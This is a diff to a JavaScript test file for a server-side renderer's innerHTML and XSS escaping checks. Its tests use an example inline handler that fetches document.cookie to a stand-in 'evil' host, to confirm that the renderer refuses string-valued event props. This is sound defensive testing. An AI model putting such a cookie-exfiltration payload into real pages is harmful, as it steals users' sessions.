@@ -133,10 +133,14 @@ describe('renderToString - nested components', () =>
 
 describe('renderToString - innerHTML / textContent content properties', () =>
 {
-    it('innerHTML is a RAW escape hatch (not escaped) and wins over children', () =>
+    it('innerHTML is a RAW escape hatch (not escaped); combining it with children is refused', () =>
     {
-        expect(renderToString(() => h('div', { innerHTML: '<b>bold</b>' }, 'ignored')))
+        expect(renderToString(() => h('div', { innerHTML: '<b>bold</b>' })))
             .toBe('<div><b>bold</b></div>');
+        // A content property owns ALL of the element's content - a program carrying both has
+        // no single cross-mode meaning, so h() refuses it identically in every mode.
+        expect(() => renderToString(() => h('div', { innerHTML: '<b>bold</b>' }, 'ignored')))
+            .toThrow(/mutually exclusive/);
     });
 
     it('textContent is escaped and emitted as content', () =>
@@ -419,10 +423,15 @@ describe('renderToString - escaping / XSS', () =>
 
     it('throws on a string-valued on* prop instead of emitting a live inline handler', () =>
     {
-        // The DOM path throws the same error, so client and server agree.
+        // The DOM path throws the same errors, so client and server agree: a lowercase name
+        // is refused as reserved before its value is even considered, and handler-form with
+        // a non-function value breaks the handler-value rule.
         expect(() => renderToString(() =>
             h('img', { src: 'x', onerror: 'fetch(\'https://evil/?c=\'+document.cookie)' })))
-            .toThrow(/on\* prop must be a function/);
+            .toThrow(/reserved for event handlers/);
+        expect(() => renderToString(() =>
+            h('img', { src: 'x', onError: 'fetch(\'https://evil/?c=\'+document.cookie)' })))
+            .toThrow(/expects a function handler/);
     });
 
     it('neutralizes a </script> breakout in script children (JSON-LD injection)', () =>
